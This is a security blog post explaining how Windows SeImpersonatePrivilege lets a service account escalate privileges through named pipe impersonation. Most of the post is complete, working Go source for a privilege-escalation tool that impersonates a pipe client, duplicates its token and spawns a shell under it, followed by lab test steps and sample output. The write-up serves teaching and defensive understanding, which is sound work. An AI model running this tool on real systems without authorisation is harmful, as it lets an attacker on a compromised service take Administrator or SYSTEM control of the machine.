---
title: What Happens When You Exploit SeImpersonatePrivilege?
author: S41F
date: 2025-11-21
categories: [Offensive Security, Windows Internal, Privilege Escalation]
tags: [SeImpersonatePrivilege, Token Impersonation, Named Pipes, Golang]
---

## Introduction

A while back, someone asked me a question that actually made sense. He wanted to know HOW the SeImpersonatePrivilege exploitation really works. Like, why does having this privilege let us escalate in the first place? What's actually happening behind the scenes?

After walking him through it, I realized this would make a decent write-up. 

Now, more than five variants are exploiting SeImpersonatePrivilege (JuicyPotato, RoguePotato, PrintSpoofer, GodPotato, SigmaPotato); the list goes on. Each one uses different tricks to trigger the exploitation. We're not going to cover all of them here.

Instead, this article focuses on **Named Pipe Impersonation**. Understanding this fundamental mechanism.

Juicy Family:
![](https://m.media-amazon.com/images/M/MV5BNzIxZmIzYjEtZGMyZi00NDAwLWJmODktYTAwOWU2ZjkwZjdlXkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg)
 
## What is SeImpersonatePrivilege?

This privilege lets a process borrow someone else's access token if it can grab a handle to it. Like, if someone hands you their ID badge, this privilege lets you actually use it.

Windows gives this to:
- Local Service accounts
- Network Service accounts  
- IIS app pools
- SQL Server service accounts
- Most other service accounts

Why it matters: If you can pop a web shell or compromise a database service, you probably have this privilege. And that's your way up to SYSTEM.

## Access Tokens Explained

Windows uses access tokens for security decisions. Every process has one. It's basically the process's ID card, what files it can read, what it can do, everything.

The interesting part: with SeImpersonatePrivilege, you can steal someone else's token and assume their identity. The hard part is getting that token.

Typical scenario:

1. Compromise some service
2. Run `whoami /priv`
3. See SeImpersonatePrivilege enabled
4. Get a privileged process to connect to you
5. Grab its token when it does
6. Spawn a process with that token

Steps 4 and 5 are where the work is, getting that privileged connection and stealing the token.

## Named Pipes, How the Magic Happens

Named Pipes let processes talk to each other on Windows. Unlike regular pipes (which are only parent-child), named pipes can connect any processes.

The key part: **you can impersonate whoever connects to your pipe**.

When someone connects to your named pipe, you call `ImpersonateNamedPipeClient()` and assume their identity. SYSTEM process connects? You're SYSTEM.

The plan:
1. Make a named pipe server
2. Wait for the privileged process to connect
3. Impersonate it
4. Steal its token
5. Use a token to spawn a new process

Step 2 is usually the tricky one. But let's build something that works first.

## Building This in Go

I choose Go because I <3 it

![](https://en.meming.world/images/en/thumb/e/e2/Crying_Cat_with_paw_up.jpg/300px-Crying_Cat_with_paw_up.jpg)

### Setting Up Windows APIs
First, load the Windows functions we need:
```go
package main

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

const (
	PIPE_ACCESS_DUPLEX       = 0x00000003
	PIPE_TYPE_BYTE           = 0x00000000
	PIPE_WAIT                = 0x00000000
	PIPE_UNLIMITED_INSTANCES = 255
	TOKEN_QUERY              = 0x0008
	TOKEN_DUPLICATE          = 0x0002
	TOKEN_ASSIGN_PRIMARY     = 0x0001
	TOKEN_ALL_ACCESS         = 0xF01FF
	TokenUser                = 1
	SecurityImpersonation    = 2
	TokenPrimary             = 1
	CREATE_NEW_CONSOLE       = 0x00000010
)

var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	advapi32 = syscall.NewLazyDLL("advapi32.dll")

	procCreateNamedPipe            = kernel32.NewProc("CreateNamedPipeW")
	procConnectNamedPipe           = kernel32.NewProc("ConnectNamedPipe")
	procImpersonateNamedPipeClient = advapi32.NewProc("ImpersonateNamedPipeClient")
	procOpenThreadToken            = advapi32.NewProc("OpenThreadToken")
	procGetTokenInformation        = advapi32.NewProc("GetTokenInformation")
	procConvertSidToStringSidW     = advapi32.NewProc("ConvertSidToStringSidW")
	procGetCurrentThread           = kernel32.NewProc("GetCurrentThread")
	procDuplicateTokenEx           = advapi32.NewProc("DuplicateTokenEx")
	procReadFile                   = kernel32.NewProc("ReadFile")
)
```

Just loading up kernel32.dll and advapi32.dll, grabbing the functions we need.

### Making the Named Pipe
```go
func createNamedPipe(pipeName string) (syscall.Handle, error) {
	pipeNameUTF16, err := syscall.UTF16PtrFromString(pipeName)
	if err != nil {
		return 0, err
	}

	handle, _, err := procCreateNamedPipe.Call(
		uintptr(unsafe.Pointer(pipeNameUTF16)),
		PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_BYTE|PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES,
		0x1000,
		0x1000,
		0,
		0,
	)

	if handle == 0 {
		return 0, fmt.Errorf("CreateNamedPipe failed: %v", err)
	}

	return syscall.Handle(handle), nil
}
```

Some notes:
- CreateNamedPipeW (the W means Unicode)
- PIPE_ACCESS_DUPLEX = read and write
- PIPE_TYPE_BYTE = raw bytes
- PIPE_WAIT = blocking mode
- Security attributes at 0 (NULL) are important, let's SYSTEM connect

Pipe names are like `\\.\pipe\whatever`.

### Waiting and Impersonating
```go
func waitAndImpersonate(pipeHandle syscall.Handle) error {
	fmt.Println("[*] Waiting for client connection...")

	ret, _, err := procConnectNamedPipe.Call(
		uintptr(pipeHandle),
		0,
	)

	if ret == 0 {
		return fmt.Errorf("ConnectNamedPipe failed: %v", err)
	}

	fmt.Println("[+] Client connected!")

	fmt.Println("[*] Reading data from pipe...")
	buffer := make([]byte, 1024)
	var bytesRead uint32

	ret, _, err = procReadFile.Call(
		uintptr(pipeHandle),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(len(buffer)),
		uintptr(unsafe.Pointer(&bytesRead)),
		0,
	)

	if ret == 0 {
		return fmt.Errorf("ReadFile failed: %v", err)
	}

	fmt.Printf("[+] Read %d bytes from client\n", bytesRead)

	ret, _, err = procImpersonateNamedPipeClient.Call(
		uintptr(pipeHandle),
	)

	if ret == 0 {
		return fmt.Errorf("ImpersonateNamedPipeClient failed: %v", err)
	}

	fmt.Println("[+] Successfully impersonated client!")
	return nil
}
```

ConnectNamedPipe blocks until someone connects. Like waiting for a phone call.

**Important:** You HAVE to read from the pipe before impersonating. Took me forever to figure this out. Windows won't let you impersonate without reading the security thing to make sure the connection is real. You can just skip the read, and you'll get errors.

After ImpersonateNamedPipeClient works, our thread is now whoever connected. We literally became them.

### Checking Who We Are
```go
func extractTokenInfo() (string, syscall.Token, error) {
	var token syscall.Token
	currentThread, _, _ := procGetCurrentThread.Call()

	ret, _, err := procOpenThreadToken.Call(
		currentThread,
		TOKEN_ALL_ACCESS,
		1,
		uintptr(unsafe.Pointer(&token)),
	)

	if ret == 0 {
		return "", 0, fmt.Errorf("OpenThreadToken failed: %v", err)
	}

	var returnLength uint32
	procGetTokenInformation.Call(
		uintptr(token),
		TokenUser,
		0,
		0,
		uintptr(unsafe.Pointer(&returnLength)),
	)

	buffer := make([]byte, returnLength)
	ret, _, err = procGetTokenInformation.Call(
		uintptr(token),
		TokenUser,
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(returnLength),
		uintptr(unsafe.Pointer(&returnLength)),
	)

	if ret == 0 {
		return "", 0, fmt.Errorf("GetTokenInformation failed: %v", err)
	}

	tokenUser := (*struct {
		User struct {
			Sid        uintptr
			Attributes uint32
		}
	})(unsafe.Pointer(&buffer[0]))

	var sidString *uint16
	ret, _, err = procConvertSidToStringSidW.Call(
		tokenUser.User.Sid,
		uintptr(unsafe.Pointer(&sidString)),
	)

	if ret == 0 {
		return "", 0, fmt.Errorf("ConvertSidToStringSid failed: %v", err)
	}

	return syscall.UTF16ToString((*[1 << 20]uint16)(unsafe.Pointer(sidString))[:]), token, nil
}
```

Using OpenThreadToken (not OpenProcessToken) because after impersonation, the token is on the thread.

The two-call thing with GetTokenInformation is classic Windows: call once to see how much memory you need, call again to get the data.

**SIDs you care about:**
- S-1-5-18 = SYSTEM (jackpot)
- S-1-5-19 = Local Service
- S-1-5-20 = Network Service  
- S-1-5-21-...-500 = Administrator

### Duplicating the Token

Here's something that got me: the impersonation token can't create processes. You need to duplicate it to a "primary token."
```go
func duplicateToken(hToken syscall.Token) (syscall.Token, error) {
	var hNewToken syscall.Token

	ret, _, err := procDuplicateTokenEx.Call(
		uintptr(hToken),
		TOKEN_ALL_ACCESS,
		0,
		SecurityImpersonation,
		TokenPrimary,
		uintptr(unsafe.Pointer(&hNewToken)),
	)

	if ret == 0 {
		return 0, fmt.Errorf("DuplicateTokenEx failed: %v", err)
	}

	return hNewToken, nil
}
```

**The difference:**
- Impersonation tokens = temporary, attached to threads
- Primary tokens = permanent, attached to processes
- Need primary token to create processes

Making a permanent copy of the temporary identity.

### Spawning the Shell
```go
func spawnShellWithToken(hToken syscall.Token) error {
	cmdLine, _ := syscall.UTF16PtrFromString("cmd.exe")

	var si syscall.StartupInfo
	var pi syscall.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Desktop = syscall.StringToUTF16Ptr("winsta0\\default")

	procCreateProcessAsUserW := advapi32.NewProc("CreateProcessAsUserW")

	ret, _, err := procCreateProcessAsUserW.Call(
		uintptr(hToken),
		0,
		uintptr(unsafe.Pointer(cmdLine)),
		0,
		0,
		0,
		CREATE_NEW_CONSOLE,
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)

	if ret == 0 {
		return fmt.Errorf("CreateProcessAsUserW failed: %v", err)
	}

	return nil
}
```

CreateProcessAsUserW is the special version that lets you pick which token to use. CREATE_NEW_CONSOLE opens a new window.
![](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTPZxGttnrXaYKDoF7pLjg8AZkMrJItfjvd8w&s)

### main func
```go
func main() {
	var pipeName string

	if len(os.Args) > 1 {
		pipeName = `\\.\pipe\` + os.Args[1]
	} else {
		pipeName = `\\.\pipe\saif`
	}

	fmt.Println("[+] Creating named pipe:", pipeName)
	pipeHandle, err := createNamedPipe(pipeName)
	if err != nil {
		fmt.Println("[-] Failed:", err)
		return
	}
	defer syscall.CloseHandle(pipeHandle)

	fmt.Println("[+] Pipe created successfully!")
	fmt.Println()

	if err := waitAndImpersonate(pipeHandle); err != nil {
		fmt.Println("[-] Failed:", err)
		return
	}

	sidString, impToken, err := extractTokenInfo()
	if err != nil {
		fmt.Println("[-] Failed to extract token:", err)
		return
	}

	fmt.Println()
	fmt.Println("[+] Impersonated Token SID:", sidString)

	fmt.Println()
	fmt.Println("[+] Duplicating token to Primary...")

	primaryToken, err := duplicateToken(impToken)
	if err != nil {
		syscall.CloseHandle(syscall.Handle(impToken))
		fmt.Println("[-] Failed:", err)
		return
	}
	defer syscall.CloseHandle(syscall.Handle(primaryToken))
	syscall.CloseHandle(syscall.Handle(impToken))

	fmt.Println("[+] Token duplicated successfully!")
	fmt.Println("[+] Spawning new shell with impersonated token...")

	if err := spawnShellWithToken(primaryToken); err != nil {
		fmt.Println("[-] Failed:", err)
		return
	}

	fmt.Println()
	fmt.Println("[+] Impersonation successful!")
	fmt.Println("[+] New cmd.exe window opened with impersonated privileges")
	fmt.Println()
}

```
Full Soruce code here : [https://github.com/SaifSalah/seimpersonate-go]  
## Testing It

![](https://github.com/SaifSalah/saifsalah.github.io/blob/master/assets/img/demo.png?raw=true)

### Steps

Get a Network Service shell with PSExec:
```cmd
psexec64 -i -u "NT AUTHORITY\Network Service" cmd.exe
```

Check you're actually Network Service:
```cmd
whoami
```
Should say `nt authority\network service`

Check privileges:
```cmd
whoami /priv
```

Look for:
```
SeImpersonatePrivilege        Impersonate a client after authentication    Enabled
```

### Running It

In your Network Service shell:
```cmd
go run main.go
```

You'll see:
```
[+] Creating named pipe: \\.\pipe\saif
[+] Pipe created successfully!

[*] Waiting for client connection...
```

### Triggering

Open another cmd as Administrator:
```cmd
echo hello > \\.\pipe\saif
```

### What Happens

Back in Network Service terminal:
```
[+] Client connected!
[*] Reading data from pipe...
[+] Read 13 bytes from client
[+] Successfully impersonated client!

[+] Impersonated Token SID: S-1-5-21-...

[+] Duplicating token to Primary...
[+] Token duplicated successfully!
[+] Spawning new shell with impersonated token...

[+] Impersonation successful!
[+] New cmd.exe window opened with impersonated privileges
```

New cmd window pops up. Run `whoami` and you're now whoever connected.

### What Just Happened

1. Started as Network Service
2. Created pipe at `\\.\pipe\saif`
3. Pipe waited for a connection
4. Administrator wrote to our pipe
5. We read the data
6. Called ImpersonateNamedPipeClient, became Administrator
7. Grabbed Administrator's token
8. Duplicated to primary token
9. Spawned cmd.exe with that token

---
Feel free to reach out to me if you spot any mistakes or have a better way to do this. Always learning.
